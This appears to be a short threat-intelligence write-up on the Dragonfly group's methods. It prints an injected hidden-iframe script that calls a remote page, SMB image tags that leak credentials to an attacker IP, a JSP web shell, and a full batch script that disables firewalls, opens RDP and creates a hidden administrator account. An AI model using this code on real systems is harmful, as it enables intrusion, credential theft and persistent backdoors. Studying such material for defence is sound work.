# Dragonfly

## Features

1. Redirect its website to the managed Lightout website by injecting HTML code.

```html
<script type="text/javascript">
var WWCPou=document.createElement("iframe");
WWCPou.height=1;
WWCPou.width=1;
WWCPou.style.visibility="hidden" ;
WWCPou.src="http://domain/wp-includes/pomo/dtsrc.php";
document.getElementsByTagName("head")[0].appendChild(WWCPou);
</script>
```

2. Use puddle attack, and modify the webpage code of the controlled website to use SMB to request the file icon from the controlled host, where the header.php file is modified to load the image.

```html
<img src="file://IP/main_logo.png" style="height: 1px; width: 1px;" />
```

The modelizer.js file will also be modified to load images. This JavaScript file is used to detect the legitimate JavaScript libraries in all aspects of the browser.

```JavaScript
var i = document.createElement("img");
i.src = "file://IP/ame_icon.png";
i.width = 3;
i.height= 2;
```

3. In the post-penetration phase, a script will be used to create a local administrator account disguised as a legitimate backup account. The script name issymantec_help.jsp，store inC:\Program Files (x86)\Symantec\Symantec Endpoint Protection Manager\tomcat\webapps\ROOT\.

```jsp
<% Runtime.getRuntime().exec("cmd /C \"" + System.getProperty("user.dir") + "\\..\\webapps\\ROOT\\<enu.cmd>\""); %>
```

The enu.cmd script is used to create an administrator account, disable the host firewall, open ports and global access for RDP, and then try to add the new user to the administrator group to obtain permissions.

```bash
netsh firewall set opmode disable  //Turn off firewall
netsh advfirewall set allprofiles state off  //Turn off the current network firewall
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List" /v 3389:TCP /t REG_SZ /d "3389:TCP:*:Enabled:Remote Desktop" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile\GloballyOpenPorts\List" /v 3389:TCP /t REG_SZ /d "3389:TCP:*:Enabled:Remote Desktop" /f
//Open Remote Desktop Port 3389
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
//Start Terminal Services
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Licensing Core" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f
//Simultaneous login of multiple users
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f
//3389 Remote Desktop multi-user login at the same time
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxInstanceCount /t REG_DWORD /d 100 /f
//Limit the maximum number of simultaneous login instances
net user MS_BACKUP password /add  //Create user
net localgroup Administrators /add MS_BACKUP
net localgroup Administradores /add MS_BACKUP
net localgroup Amministratori /add MS_BACKUP
net localgroup Administratoren /add MS_BACKUP
net localgroup Administrateurs /add MS_BACKUP
net localgroup "Remote Desktop Users" /add MS_BACKUP
//Add user to administrator group
net user MS_BACKUP /expires:never  //Specify that users never expire
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v MS_BACKUP /t REG_DWORD /d 0 /f
//Set users as hidden users
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f
//Do not display the last user name when logging in
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
//Disable local account token filter
sc config termservice start = auto  //Set Terminal Services configuration
net start termservice  //Enable Terminal Services
```
